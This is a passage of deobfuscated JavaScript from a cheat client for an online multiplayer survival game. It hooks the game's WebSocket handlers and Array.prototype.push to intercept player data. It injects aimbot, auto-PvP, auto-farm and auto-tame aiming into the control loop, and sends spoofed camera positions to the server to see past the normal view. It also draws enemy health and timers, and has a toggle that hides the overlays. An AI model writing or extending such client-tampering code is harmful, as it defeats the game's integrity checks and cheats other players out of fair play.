                      if (USERTOFIX.inv.n[a0CONNectloop.WHEAT]) {
                        setTimeout(() => {
                          a0PARSestream(a0CONNectloop.WHEAT);
                          a0REMOvezip("Wheats: " + USERTOFIX.inv.n[a0CONNectloop.WHEAT]);
                        }, r);
                        r += 1100;
                      }
                      if (USERTOFIX.inv.n[a0CONNectloop.TOMATO]) {
                        setTimeout(() => {
                          a0PARSestream(a0CONNectloop.TOMATO);
                          a0REMOvezip("Tomatoes: " + USERTOFIX.inv.n[a0CONNectloop.TOMATO]);
                        }, r);
                      }
                    }
                  }
                  if (a0JUMPfile.AutoSpike.isSpikeInWater && USERTOFIX.in_team(o[1]) && USERTOFIX.inv.n[a0CONNectloop.BRIDGE]) {
                    let c = a0PULLfolder(o[2]);
                    if (c) {
                      a0NAVIgatequeue(c.j, c.i);
                    }
                  }
                  break;
                case 2:
                  {
                    let O = o[1];
                    a0CLONelog.players[O].nickname = o[2];
                    (thisPlayer = a0CLONelog.players[O]).alive = true;
                    thisPlayer.joinTime = performance.now();
                    setTimeout(() => {
                      a0KILLcache.Join.unshift(O);
                      if (a0KILLcache.Join.length > 5) {
                        a0KILLcache.Join.pop();
                      }
                    }, 750);
                    a0KILLcache.toggle11 = true;
                    clearTimeout(a0KILLcache.toggle1);
                    a0KILLcache.toggle1 = setTimeout(() => {
                      a0KILLcache.toggle11 = false;
                    }, 10000);
                  }
                  break;
                case 3:
                  a0CLONelog.max_units = o[7];
                  if (USERTOFIX.uid !== a0CLONelog.max_units * USERTOFIX.id) {
                    USERTOFIX.uid = a0CLONelog.max_units * USERTOFIX.id;
                    console.log("Wrong hook user.uid");
                  }
                  a0LISTenjob.HPTimer = Date.now();
                  a0LISTenjob.GaugeTimer = Date.now();
                  let p = o[4];
                  for (var u = 0, N = p.length; u < N; u++) {
                    let E = p[u].i;
                    a0CLONelog.players[E].alive = true;
                  }
                  a0CLONelog.players.forEach(e => {
                    if (!a0PROMptload.nickname) {
                      let i = Object.keys(e);
                      a0PROMptload.nickname = i[0];
                    }
                    e.nickname = e[a0PROMptload.nickname];
                    t ||= Object.keys(e).find(t => typeof e[t] == "object" && e[t] === null && t !== "label");
                    Object.defineProperty(e, "label_winter", {
                      get() {
                        return this[t];
                      },
                      set(e) {
                        this[t] = e;
                      }
                    });
                  });
                  workerTimers.setTimeout(() => {
                    let e = a0CLONelog.players[USERTOFIX.id];
                    a0OPTImizeload(e.nickname, e.level);
                  }, 2000);
                  a0QUEUearray.connect();
                  USERTOFIX.blizzard = false;
                  a0CLONelog.nw = o[20];
                  a0CLONelog.nh = o[21];
                  if (a0JUMPfile.ShowLastDead.Pos) {
                    workerTimers.setTimeout(() => {
                      a0JUMPfile.ShowLastDead.Pos = null;
                    }, 360000);
                  }
              }
            } else {
              let d = new Uint8Array($.data);
              switch (d[0]) {
                case 15:
                  a0INSTalltask = true;
                  workerTimers.setTimeout(() => {
                    a0INSTalltask = false;
                  }, 200);
                  let f = d[1];
                  if (f === a0DRAWbuffer.autopvpLockId) {
                    a0DRAWbuffer.autopvpLockId = 0;
                    a0INSErtpolicy?.refresh();
                  }
                  a0CLONelog.players[f].alive = false;
                  a0KILLcache.Leave.unshift(a0CLONelog.players[f].nickname + " | " + a0CLONelog.players[f].level);
                  if (a0KILLcache.Leave.length > 5) {
                    a0KILLcache.Leave.pop();
                  }
                  a0KILLcache.toggle22 = true;
                  clearTimeout(a0KILLcache.toggle2);
                  a0KILLcache.toggle2 = setTimeout(() => {
                    a0KILLcache.toggle22 = false;
                  }, 10000);
                  break;
                case 25:
                  let g = a0CLONelog.fast_units[USERTOFIX.uid];
                  if (g) {
                    a0JUMPfile.ShowLastDead.Pos = {
                      x: g.x,
                      y: g.y
                    };
                  }
                  break;
                case 28:
                  for (let A = 0, h = a0POSTthread.length; A < h; A++) {
                    USERTOFIX.inv.n[a0POSTthread[A]] = 0;
                  }
                  break;
                case 29:
                  if (a0JUMPfile.AutoCrown.e && USERTOFIX.inv.n[a0CONNectloop.CROWN_OF_THE_ANGEL] && a0JUMPfile.AutoCrown.health_to_activate === 200) {
                    a0GETList.select_inv(a0CONNectloop.CROWN_OF_THE_ANGEL);
                  }
                  break;
                case 31:
                case 32:
                case 33:
                case 34:
                  if (d[0] === 34 || d[0] === 32 && d[1] === USERTOFIX.id) {
                    a0HANDlelog = null;
                  } else if (d[0] === 31) {
                    let R = a0CLONelog.units[a0HOOKjob.TOTEM].find(e => USERTOFIX.in_team(e.pid));
                    if (R) {
                      a0HANDlelog = {
                        x: R.x,
                        y: R.y
                      };
                    }
                  }
                  a0MINIfyfile();
                  if (a0QUEUearray && a0QUEUearray.socket && a0QUEUearray.socket.readyState === 1) {
                    a0QUEUearray.send_update_team(USERTOFIX.team);
                  }
                  break;
                case 70:
                  let C = d[1];
                  USERTOFIX.blizzard = C;
                  if (C) {
                    a0FORMatzip = performance.now();
                  }
              }
            }
          };
        })();
        (function e() {
          let t = a0GETList.socket.send;
          a0GETList.socket.send = function (...e) {
            let i = e[0];
            if (typeof i == "string") {
              JSON.parse(i)[0];
            } else {
              new Uint8Array(i)[0];
            }
            if (a0GETList.socket.readyState === 1) {
              t.apply(this, e);
            }
          };
        })();
      };
    } else {
      console.log("Failed to hook on create socket function");
    }
  })();
  (function e() {
    let t = Object.keys(a0MINIfyresult.gauges)[2];
    if (t && a0MINIfyresult.gauges[t] && typeof a0MINIfyresult.gauges[t] == "function") {
      let i = a0MINIfyresult.gauges[t];
      a0MINIfyresult.gauges[t] = function () {
        if (a0JUMPfile.GaugesUI !== "new" || a0JUMPfile.HideScript.e) {
          i.apply(this, arguments);
        } else {
          a0HASHinput.apply(this, arguments);
        }
        if (a0JUMPfile.ShowGauges.e && !a0JUMPfile.HideScript.e) {
          if (a0JUMPfile.GaugesUI === "new") {
            a0LOADstring.save();
            let e = USERTOFIX.inv.can_select.length > 0 ? -70 : 0;
            if (USERTOFIX.chest.open || USERTOFIX.furnace.open && USERTOFIX.inv.n[a0CONNectloop.WOOD] || USERTOFIX.windmill.open && USERTOFIX.inv.n[a0CONNectloop.WHEAT] || USERTOFIX.extractor.open && USERTOFIX.inv.n[a0CONNectloop.WOOD] || USERTOFIX.well.open && USERTOFIX.inv.n[a0CONNectloop.BUCKET_FULL] || USERTOFIX.bread_oven.open && (USERTOFIX.inv.n[a0CONNectloop.WOOD] || USERTOFIX.inv.n[a0CONNectloop.FLOUR])) {
              e -= a0BALAncevalues * 50;
            }
            a0LOADstring.translate(innerWidth / 2, e);
            a0LOADstring.font = "48px Baloo Paaji";
            a0LOADstring.lineWidth = 7;
            a0LOADstring.fillStyle = "#fff";
            {
              a0LOADstring.textAlign = "center";
              if (Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000) > 5) {
                a0LOADstring.strokeStyle = "#aa362d";
              } else {
                a0LOADstring.strokeStyle = "#6da151";
              }
              let t = Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000) > 5 ? Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000 - 5) : Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000);
              a0LOADstring.strokeText(t, 0, this.translate.y + a0BALAncevalues * 34);
              a0LOADstring.fillText(t, 0, this.translate.y + a0BALAncevalues * 34);
            }
            if (USERTOFIX.gauges.oxygen.x < 1) {
              a0LOADstring.font = "28px Baloo Paaji";
              a0LOADstring.strokeStyle = "#9cb9c4";
              a0LOADstring.strokeText(Math.floor(USERTOFIX.gauges.oxygen.x * 100), 0, this.translate.y - a0BALAncevalues * 30);
              a0LOADstring.fillText(Math.floor(USERTOFIX.gauges.oxygen.x * 100), 0, this.translate.y - a0BALAncevalues * 30);
            }
            a0LOADstring.font = "34px Baloo Paaji";
            a0LOADstring.strokeStyle = "#6da151";
            a0LOADstring.textAlign = "left";
            a0LOADstring.strokeText(Math.floor(USERTOFIX.gauges.life.x * 200), a0BALAncevalues * -435, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.fillText(Math.floor(USERTOFIX.gauges.life.x * 200), a0BALAncevalues * -435, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.strokeStyle = "#aa362d";
            a0LOADstring.strokeText(Math.floor(USERTOFIX.gauges.hunger.x * 100), a0BALAncevalues * -195, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.fillText(Math.floor(USERTOFIX.gauges.hunger.x * 100), a0BALAncevalues * -195, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.textAlign = "right";
            a0LOADstring.fillStyle = "#fff";
            a0LOADstring.strokeStyle = "#174984";
            a0LOADstring.strokeText(Math.floor(USERTOFIX.gauges.thirst.x * 100), a0BALAncevalues * 435, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.fillText(Math.floor(USERTOFIX.gauges.thirst.x * 100), a0BALAncevalues * 435, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.strokeStyle = "#6b9baf";
            a0LOADstring.strokeText(USERTOFIX.gauges.cold.x === 1 ? 200 - Math.floor(USERTOFIX.gauges.warm.x * 100) : Math.floor(USERTOFIX.gauges.cold.x * 100), a0BALAncevalues * 195, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.fillText(USERTOFIX.gauges.cold.x === 1 ? 200 - Math.floor(USERTOFIX.gauges.warm.x * 100) : Math.floor(USERTOFIX.gauges.cold.x * 100), a0BALAncevalues * 195, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.restore();
          } else {
            a0LOADstring.save();
            let $ = USERTOFIX.inv.can_select.length > 0 ? -70 : 0;
            if (USERTOFIX.chest.open || USERTOFIX.furnace.open && USERTOFIX.inv.n[a0CONNectloop.WOOD] || USERTOFIX.windmill.open && USERTOFIX.inv.n[a0CONNectloop.WHEAT] || USERTOFIX.extractor.open && USERTOFIX.inv.n[a0CONNectloop.WOOD] || USERTOFIX.well.open && USERTOFIX.inv.n[a0CONNectloop.BUCKET_FULL] || USERTOFIX.bread_oven.open && (USERTOFIX.inv.n[a0CONNectloop.WOOD] || USERTOFIX.inv.n[a0CONNectloop.FLOUR])) {
              $ -= a0BALAncevalues * 50;
            }
            a0LOADstring.translate((innerWidth - a0BALAncevalues * 950) / 2, $);
            a0LOADstring.font = "34px Baloo Paaji";
            a0LOADstring.strokeStyle = "#6da151";
            a0LOADstring.fillStyle = "#fff";
            a0LOADstring.lineWidth = 7;
            a0LOADstring.strokeText(Math.floor(USERTOFIX.gauges.life.x * 200), this.translate.x + a0BALAncevalues * 50, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.fillText(Math.floor(USERTOFIX.gauges.life.x * 200), this.translate.x + a0BALAncevalues * 50, this.translate.y + a0BALAncevalues * 8);
            if (Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000) > 5) {
              a0LOADstring.strokeStyle = "#aa362d";
            } else {
              a0LOADstring.strokeStyle = "#6da151";
            }
            let o = Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000) > 5 ? Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000 - 5) : Math.floor(11 - (Date.now() - a0LISTenjob.HPTimer) / 1000);
            a0LOADstring.strokeText(o, this.translate.x + a0BALAncevalues * 469, this.translate.y + a0BALAncevalues * 36);
            a0LOADstring.fillText(o, this.translate.x + a0BALAncevalues * 469, this.translate.y + a0BALAncevalues * 36);
            a0LOADstring.strokeStyle = "#aa362d";
            a0LOADstring.strokeText(Math.floor(USERTOFIX.gauges.hunger.x * 100) + "%", this.translate.x + a0BALAncevalues * 290, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.fillText(Math.floor(USERTOFIX.gauges.hunger.x * 100) + "%", this.translate.x + a0BALAncevalues * 290, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.fillStyle = "#fff";
            a0LOADstring.strokeStyle = "#174984";
            a0LOADstring.strokeText(Math.floor(USERTOFIX.gauges.thirst.x * 100) + "%", this.translate.x + a0BALAncevalues * 770, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.fillText(Math.floor(USERTOFIX.gauges.thirst.x * 100) + "%", this.translate.x + a0BALAncevalues * 770, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.strokeStyle = "#6b9baf";
            a0LOADstring.strokeText((USERTOFIX.gauges.cold.x === 1 ? 200 - Math.floor(USERTOFIX.gauges.warm.x * 100) : Math.floor(USERTOFIX.gauges.cold.x * 100)) + "%", this.translate.x + a0BALAncevalues * 530, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.fillText((USERTOFIX.gauges.cold.x === 1 ? 200 - Math.floor(USERTOFIX.gauges.warm.x * 100) : Math.floor(USERTOFIX.gauges.cold.x * 100)) + "%", this.translate.x + a0BALAncevalues * 530, this.translate.y + a0BALAncevalues * 8);
            a0LOADstring.restore();
          }
        }
      };
    } else {
      console.log("Failed to hook draw_gauges");
    }
  })();
  {
    let e = Object.keys(a0GETList);
    let t;
    for (let i = 0; i < e.length; i++) {
      let $ = a0GETList[e[i]];
      if (typeof $ == "function" && $.toString().includes(".length") && $.toString().includes(".loaded") && $.toString().includes(".angle")) {
        t = i - 1;
        break;
      }
    }
    if (t) {
      let o = a0GETList[e[t]];
      a0GETList[e[t]] = function (...e) {
        if (a0JUMPfile.ShowPing.e && (a0CLONelog.fast_units[USERTOFIX.uid] || a0JUMPfile.Spectator.e)) {
          a0BUILdresult = Date.now() - a0MINIfyzip;
        } else {
          o.apply(this, e);
        }
      };
    } else {
      console.log("Failed to hook client.recover_focus");
    }
  }
  {
    let l = Object.keys(USERTOFIX.control);
    let n = l.find(e => typeof USERTOFIX.control[e] == "function");
    if (n) {
      USERTOFIX.control[n];
      USERTOFIX.control[n] = function () {
        let e = a0CLONelog.fast_units[USERTOFIX.uid];
        let t;
        t = e ? {
          x: USERTOFIX.cam.x + e.x,
          y: USERTOFIX.cam.y + e.y
        } : a0LOADsocket;
        let i;
        if ((a0JUMPfile.Aimbot.e || a0JUMPfile.AutoPvP.e) && a0JUMPfile.Aimbot.angle !== null) {
          i = a0JUMPfile.Aimbot.angle;
          if (a0JUMPfile.Aimbot.isSmooth) {
            e.nangle = a0JUMPfile.Aimbot.angle;
          } else {
            e.nangle = a0JUMPfile.Aimbot.angle;
            e.angle = a0JUMPfile.Aimbot.angle;
          }
        } else if (a0JUMPfile.AutoKsDeadBox.e && a0JUMPfile.AutoKsDeadBox.angle !== null) {
          i = a0JUMPfile.AutoKsDeadBox.angle;
          e.nangle = i;
        } else if (a0JUMPfile.AutoFarm.e && a0JUMPfile.AutoFarm.angle !== null) {
          i = a0JUMPfile.AutoFarm.angle;
          e.nangle = a0JUMPfile.AutoFarm.angle;
        } else if (a0JUMPfile.AutoHamCmty.e && a0JUMPfile.AutoHamCmty.angle !== null) {
          i = a0JUMPfile.AutoHamCmty.angle;
          e.nangle = a0JUMPfile.AutoHamCmty.angle;
        } else if (a0JUMPfile.AntiHood.e && a0JUMPfile.AntiHood.angle) {
          i = a0JUMPfile.AntiHood.angle;
          e.nangle = i;
        } else if (a0JUMPfile.AutoTame.e && a0JUMPfile.AutoTame.angle) {
          i = a0JUMPfile.AutoTame.e;
          e.nangle = i;
        } else if (e) {
          i = a0KICKport(a0DECOdestatus.pos, t, false) + Math.PI;
          e.angle = i;
          e.nangle = i;
        }
        let $ = false;
        this.mouse += a0DISPatchinput;
        if (!a0DECOdestatus.state && e && !(e.action & a0PROMptlog.ATTACK) && this.mouse > a0INVErttimer.ATTACK) {
          this.attack = 1;
          $ = true;
          this.mouse = 0;
          a0REMOveevent(i);
        }
        if (!$) {
          this.timeout += a0DISPatchinput;
          if (this.timeout > a0INVErttimer.ROTATE) {
            this.timeout = 0;
            if (Math.abs(this.angle - i) > 0.005) {
              a0BUILdstats(i);
              if (a0JUMPfile.Aimbot.angle === null) {
                this.angle = i;
              }
            }
          }
        }
        if (USERTOFIX.chat.open || USERTOFIX.terminal.open) {
          return;
        }
        let o = 0;
        // if (a0QUEUeschema.is_left()) {
        //   o |= 1;
        // }
        // if (a0QUEUeschema.is_right()) {
        //   o |= 2;
        // }
        // if (a0QUEUeschema.is_bottom()) {
        //   o |= 4;
        // }
        // if (a0QUEUeschema.is_top()) {
        //   o |= 8;
        // }
        if (a0PARSealive != o && !a0JUMPfile.Spectator.e) {
          a0OPENdata(o);
        }
        a0PARSealive = o;
      };
    } else {
      console.log("Failed to hook user.control.update");
    }
  }
  {
    let s = Object.keys(a0GETList);
    let r = s.find(e => typeof a0GETList[e] == "function" && a0GETList[e].toString().replace(/\s+/g, "").includes("Math.floor(") && a0GETList[e].toString().replace(/\s+/g, "").includes(".stringify(") && a0GETList[e].toString().replace(/\s+/g, "").includes(".x"));
    if (r) {
      a0GETList[r];
      a0GETList[r] = function () {
        if (a0LIMItvalues - this.cam_delay > a0INVErttimer.CAM_DELAY || a0DRAWparser && performance.now() - a0COMPressdata > a0INVErttimer.CAM_DELAY) {
          a0COMPressdata = performance.now();
          this.cam_delay = a0LIMItvalues;
          let e = USERTOFIX.cam;
          let t = Math.floor(e.x / 100);
          let i = Math.floor(e.y / 100);
          if (a0MERGehandler) {
            switch (a0COMPutetext) {
              case 0:
                a0COMPutetext++;
                a0GETList.socket.send(JSON.stringify([0, Math.floor(-e.x), Math.floor(-e.y)]));
                break;
              case 1:
                a0COMPutetext++;
                if (a0CLONelog.fast_units[USERTOFIX.uid]) {
                  a0GETList.socket.send(JSON.stringify([0, Math.floor(a0CLONelog.fast_units[USERTOFIX.uid].x), Math.floor(a0CLONelog.fast_units[USERTOFIX.uid].y)]));
                }
                break;
              case 2:
                a0COMPutetext++;
                if (a0CLONelog.fast_units[USERTOFIX.uid]) {
                  a0GETList.socket.send(JSON.stringify([0, Math.floor(a0CLONelog.fast_units[USERTOFIX.uid].x), Math.floor(a0CLONelog.fast_units[USERTOFIX.uid].y - 1400)]));
                }
                break;
              case 3:
                a0COMPutetext++;
                if (a0CLONelog.fast_units[USERTOFIX.uid]) {
                  a0GETList.socket.send(JSON.stringify([0, Math.floor(a0CLONelog.fast_units[USERTOFIX.uid].x - 1700), Math.floor(a0CLONelog.fast_units[USERTOFIX.uid].y - 1400)]));
                }
                break;
              case 4:
                a0COMPutetext = 1;
                if (a0CLONelog.fast_units[USERTOFIX.uid]) {
                  a0GETList.socket.send(JSON.stringify([0, Math.floor(a0CLONelog.fast_units[USERTOFIX.uid].x - 1700), Math.floor(a0CLONelog.fast_units[USERTOFIX.uid].y)]));
                }
            }
          } else if (this.last_cam.i != t || this.last_cam.j != i) {
            a0GETList.socket.send(JSON.stringify([0, Math.floor(-e.x) + 275, Math.floor(-e.y) + 160]));
            this.last_cam.i = t;
            this.last_cam.j = i;
          }
        }
      };
      Object.defineProperty(a0GETList, "update_cam", {
        get() {
          return this[r];
        }
      });
    } else {
      console.log("Failed to hook client.update_cam");
    }
  }
  {
    let c = a0GETList.select_craft;
    a0GETList.select_craft = function (e) {
      let t = a0CLONelog.fast_units[USERTOFIX.uid];
      if (a0JUMPfile.AutoBook.e && USERTOFIX.inv.n[a0CONNectloop.BOOK] && !USERTOFIX.weapon.wait) {
        if (a0PROCesshandler !== null) {
          if (a0PROCesshandler !== a0CONNectloop.BOOK) {
            a0DEFErpayload = a0PROCesshandler;
            a0HYDRatequeue(a0CONNectloop.BOOK);
            a0PROCesshandler = a0CONNectloop.BOOK;
          }
        } else if (t && t.right !== a0CONNectloop.BOOK) {
          a0DEFErpayload = t.right === -1 ? a0CONNectloop.HAND : t.right;
          a0HYDRatequeue(a0CONNectloop.BOOK);
          a0PROCesshandler = a0CONNectloop.BOOK;
        }
      }
      if (c.call(this, e)) {
        a0EXPAndresult = e;
      }
    };
  }
  {
    let O = a0GETList.recycle_inv;
    a0GETList.recycle_inv = function (e) {
      O.call(this, e);
      a0HIGHlightfile = e;
    };
  }
  {
    let p = Object.keys(a0GETList);
    let u;
    for (let N = 0; N < p.length; N++) {
      let E = a0GETList[p[N]];
      if (typeof E == "function" && E.toString().includes(".wait") && E.toString().includes("var") && E.toString().includes(".id")) {
        u = N;
        break;
      }
    }
    if (u) {
      let d = a0GETList[p[u]];
      a0GETList[p[u]] = function (...e) {
        let t = -1;
        if (a0JUMPfile.Equiq && USERTOFIX.inv.n[USERTOFIX.craft.preview] - 1) {
          t = USERTOFIX.craft.preview;
        }
        d.apply(this, e);
        if (a0JUMPfile.Equiq) {
          USERTOFIX.craft.preview = t;
        }
      };
    } else {
      console.log("Failed to hook client.accept_build");
    }
  }
  {
    let f = a0PROMptload.draw;
    let g;
    let A;
    let h = a0PROMptload.update;
    let R;
    let C;
    let y;
    let m;
    let M;
    let L;
    let P;
    let D;
    let T;
    let _;
    let I;
    let S;
    let k;
    let b = a0PROMptload.ghost;
    let v = Array.prototype.push;
    Array.prototype.push = function (...e) {
      let t = e[0];
      if (typeof t == "object" && t && "type" in t && "id" in t && "x" in t && "y" in t) {
        if (!R) {
          a0PROMptload.pid = Object.keys(t)[1];
          R = a0PROMptload.pid;
        }
        t.pid = t[R];
        t.spawnTime = Date.now();
        switch (t.type) {
          case a0HOOKjob.PLAYERS:
            t.maxHp = a0OVERridestate(t.type);
            t.currentHp = t.maxHp;
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!C) {
              let i = Object.keys(t);
              a0PROMptload.vehicle = i[i.indexOf("right") + 1];
              C = a0PROMptload.vehicle;
            }
            Object.defineProperty(t, "vehicle", {
              get() {
                return this[C];
              },
              set(e) {
                this[C] = e;
              }
            });
            Object.defineProperty(t, "ghost", {
              get() {
                return this[b];
              },
              set(e) {
                return this[b] = e;
              }
            });
            if (t.ghost) {
              if (!t.spawnGhostTime || 60 - (performance.now() - t.spawnGhostTime) / 1000 < 0) {
                t.spawnGhostTime = performance.now();
              }
            } else {
              t.spawnGhostTime = null;
            }
            if (!y) {
              let $ = Object.keys(t);
              let o = $.filter(e => Array.isArray(t[e]));
              let l = o[0];
              let n = $.indexOf(l);
              y = $[n + 1];
              a0PROMptload.tower = y;
            }
            Object.defineProperty(t, "tower", {
              get() {
                return this[y];
              }
            });
            if (!L) {
              let s = Object.keys(t);
              a0PROMptload.fly = s[s.indexOf("freeze") - 12];
              L = a0PROMptload.fly;
            }
            Object.defineProperty(t, "fly", {
              get() {
                return this[L];
              }
            });
            if (!P) {
              let r = Object.keys(t);
              a0PROMptload.nangle = r[r.indexOf("action") - 1];
              P = a0PROMptload.nangle;
            }
            Object.defineProperty(t, "nangle", {
              get() {
                return this[P];
              },
              set(e) {
                this[a0PROMptload.nangle] = e;
              }
            });
            Object.defineProperty(t, "weapon", {
              get() {
                return !!a0DRAWjob[this.right];
              }
            });
            if (!D) {
              let c = Object.keys(t);
              a0PROMptload.clothe = c[c.indexOf("bubbles") - 2];
              D = a0PROMptload.clothe;
            }
            Object.defineProperty(t, "clothe", {
              get() {
                return this[D];
              }
            });
            if (!T) {
              let O = Object.keys(t);
              a0PROMptload.speed = O[O.indexOf("r") + 1];
              T = a0PROMptload.speed;
            }
            if (!m) {
              let p = Object.keys(t);
              let u = p.find(e => typeof t[e] == "object" && "max" in t[e] && "min" in t[e]);
              m = p[p.indexOf(u) + 2];
              a0PROMptload.tower_fx = m;
            }
            Object.defineProperty(t, "tower_fx", {
              get() {
                return this[m];
              }
            });
            if (!M) {
              let N = Object.keys(t);
              let E = N.find(e => typeof t[e] == "object" && "max" in t[e] && "min" in t[e]);
              M = N[N.indexOf(E) + 1];
              a0PROMptload.vehicle_fx5 = M;
            }
            Object.defineProperty(t, "vehicle_fx5", {
              get() {
                return this[M];
              }
            });
            Object.defineProperty(t, "speed", {
              get() {
                return this[T];
              }
            });
            k ||= Object.keys(t).find(e => typeof t[e] == "object" && t[e] && "label" in t[e] && "level" in t[e]);
            Object.defineProperty(t, "player", {
              get() {
                return this[k];
              }
            });
            let d = Symbol("privateX");
            t.r[d] = t.r.x;
            t.r.oldX = t.r.x;
            Object.defineProperty(t.r, "x", {
              get() {
                return this[d];
              },
              set(e) {
                this.oldX = this.x;
                this[d] = e;
              }
            });
            let H = Symbol("privateY");
            t.r[H] = t.r.y;
            t.r.oldY = t.r.y;
            Object.defineProperty(t.r, "y", {
              get() {
                return this[H];
              },
              set(e) {
                this.oldY = this.y;
                this[H] = e;
              }
            });
            if (!f) {
              let U = Object.keys(t);
              f = U.find(e => typeof t[e] == "function");
              a0PROMptload.draw = f;
            }
            if (t.pid !== USERTOFIX.id) {
              let B = t[f];
              t[f] = function () {
                B.apply(this, arguments);
                if (!a0JUMPfile.HideScript.e) {
                  if (a0JUMPfile.ShowMovement.e && a0JUMPfile.ShowMovement.player) {
                    a0LOADstring.save();
                    a0LOADstring.lineWidth = 2.6;
                    a0LOADstring.beginPath();
                    a0LOADstring.moveTo(USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
                    a0LOADstring.lineTo(USERTOFIX.cam.x + this.r.x, USERTOFIX.cam.y + this.r.y);
                    if (this.ally) {
                      a0LOADstring.strokeStyle = "cyan";
                    } else {
                      a0LOADstring.strokeStyle = "red";
                    }
                    a0LOADstring.stroke();
                    a0LOADstring.restore();
                  }
                  if (a0JUMPfile.VisualHp.e && a0JUMPfile.VisualHp.player && this.currentHp > 0 && !this.ghost) {
                    a0LOADstring.save();
                    a0LOADstring.translate(USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
                    a0LOADstring.font = "26px Baloo Paaji";
                    a0LOADstring.textAlign = "center";
                    a0LOADstring.textBaseline = "middle";
                    a0LOADstring.strokeStyle = "black";
                    a0LOADstring.fillStyle = this.ally ? "#44AAFF" : "#FF4444";
                    a0LOADstring.lineWidth = 4;
                    let e;
                    e = a0GENEraterandom[this.pid] ? Math.floor(a0GENEraterandom[this.pid]) : Math.floor(this.currentHp);
                    a0LOADstring.strokeText(e, 0, -30);
                    a0LOADstring.fillText(e, 0, -30);
                    a0LOADstring.restore();
                  }
                  if (a0JUMPfile.DrawTimerInPlayer.e && a0JUMPfile.DrawTimerInPlayer.isInOthers && this.lastHealTime) {
                    a0LOADstring.save();
                    a0LOADstring.translate(USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y + 46);
                    a0LOADstring.font = "22px Baloo Paaji";
                    a0LOADstring.textAlign = "center";
                    a0LOADstring.textBaseline = "middle";
                    a0LOADstring.lineWidth = 3;
                    a0LOADstring.strokeStyle = "black";
                    let t = performance.now() - this.lastHealTime;
                    let i = t % 10000;
                    if (Math.floor(11 - i / 1000) > 5) {
                      timerText = Math.floor(11 - i / 1000 - 5);
                      a0LOADstring.fillStyle = "white";
                    } else {
                      timerText = Math.floor(11 - i / 1000);
                      a0LOADstring.fillStyle = "#6da151";
                    }
                    a0LOADstring.strokeText(timerText, 0, 0);
                    a0LOADstring.fillText(timerText, 0, 0);
                    a0LOADstring.restore();
                  }
                  if (a0JUMPfile.HoodTimer.e && this.hoodTimerV) {
                    a0LOADstring.save();
                    a0LOADstring.translate(USERTOFIX.cam.x + this.x - 46, USERTOFIX.cam.y + this.y + 43);
                    a0LOADstring.beginPath();
                    a0LOADstring.globalAlpha = 0.75;
                    a0LOADstring.lineWidth = a0BALAncevalues * 4;
                    a0LOADstring.strokeStyle = a0JUMPfile.HoodTimer.color;
                    a0LOADstring.lineCap = "round";
                    a0LOADstring.arc(0, 0, a0BALAncevalues * 12, 0, Math.PI * 2 * this.hoodTimerV);
                    a0LOADstring.stroke();
                    a0LOADstring.restore();
                  }
                  if (a0JUMPfile.DrawWeaponSwitchDelay.e && this.pullWeaponTime) {
                    let $ = performance.now() - this.pullWeaponTime;
                    let o = Object.values(USERTOFIX.weapon.timeout);
                    let l = o[4];
                    let n = 1 / l * 1000;
                    if ($ <= n) {
                      a0LOADstring.save();
                      a0LOADstring.translate(USERTOFIX.cam.x + this.x + 46, USERTOFIX.cam.y + this.y + 43);
                      a0LOADstring.beginPath();
                      a0LOADstring.globalAlpha = 0.75;
                      a0LOADstring.lineWidth = a0BALAncevalues * 4;
                      if (this.dist_winter > 0) {
                        a0LOADstring.strokeStyle = "black";
                      } else {
                        a0LOADstring.strokeStyle = "white";
                      }
                      a0LOADstring.lineCap = "round";
                      a0LOADstring.arc(0, 0, a0BALAncevalues * 12, 0, Math.PI * 2 * ($ / n));
                      a0LOADstring.stroke();
                      a0LOADstring.restore();
                    } else {
                      this.pullWeaponTime = null;
                    }
                  }
                }
                if (this.clothe === a0CONNectloop.HOOD && a0CLONelog.time || this.clothe === a0CONNectloop.WINTER_HOOD) {
                  let s;
                  s = this.clothe === a0CONNectloop.HOOD ? 8000 : a0CLONelog.time === 1 ? 4000 : 8000;
                  let r = performance.now() - (this.hitedTime > this.pullHoodTime ? this.hitedTime : this.pullHoodTime);
                  this.hoodTimerV = Math.min(r / s, 1);
                } else {
                  this.hoodTimerV = null;
                }
              };
            } else {
              let j = t[f];
              t[f] = function () {
                j.apply(this, arguments);
                if (this.clothe === a0CONNectloop.HOOD && a0CLONelog.time || this.clothe === a0CONNectloop.WINTER_HOOD) {
                  let e;
                  e = this.clothe === a0CONNectloop.HOOD ? 8000 : a0CLONelog.time === 1 ? 4000 : 8000;
                  let t = performance.now() - (this.hitedTime > this.pullHoodTime ? this.hitedTime : this.pullHoodTime);
                  this.hoodTimerV = Math.min(t / e, 1);
                } else {
                  this.hoodTimerV = null;
                }
                if (!a0JUMPfile.HideScript.e && a0JUMPfile.HoodTimer.e && this.hoodTimerV) {
                  a0LOADstring.save();
                  a0LOADstring.translate(USERTOFIX.cam.x + this.x - 46, USERTOFIX.cam.y + this.y + 43);
                  a0LOADstring.beginPath();
                  a0LOADstring.globalAlpha = 0.75;
                  a0LOADstring.lineWidth = a0BALAncevalues * 4;
                  a0LOADstring.strokeStyle = a0JUMPfile.HoodTimer.color;
